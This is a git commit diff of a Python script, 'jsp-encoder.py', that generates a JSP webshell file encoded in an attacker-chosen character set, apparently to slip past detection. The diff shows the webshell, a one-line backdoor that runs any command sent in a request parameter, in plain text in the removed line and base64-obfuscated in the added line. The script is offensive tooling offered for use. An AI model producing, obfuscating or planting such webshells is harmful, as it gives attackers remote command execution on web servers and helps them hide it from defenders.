55923fa3a2dde28e935c0340877d17b723299657
0xNoOb <64947085+rexSurprise@users.noreply.github.com>
2022-09-06 09:14:24 +0800

    Update jsp-encoder.py

--- jsp/jsp-encoder.py
+++ jsp/jsp-encoder.py
@@ -1,8 +1,9 @@
-webshell = '<%Runtime.getRuntime().exec(request.getParameter("i"));%>'
+import base64
+webshell = base64.b64decode('PCVSdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKHJlcXVlc3QuZ2V0UGFyYW1ldGVyKCJpIikpOyU+').decode('ascii')
 charset = '<%@ page contentType="charset={cs}" %>'
 if __name__ == '__main__':
-  _charset = input('Enter Your Charset:')
-  if _charset:
-    with open(f'{_charset}.jsp', 'wb') as f:
-      f.write(charset.format(cs=_charset))
-      f.write(webshell.encode(_charset))
+    _charset = input('Enter Your Charset:')
+    if _charset:
+        with open(f'{_charset}.jsp', 'wb') as f:
+            f.write(charset.format(cs=_charset).encode('ascii'))
+            f.write(webshell.encode(_charset))
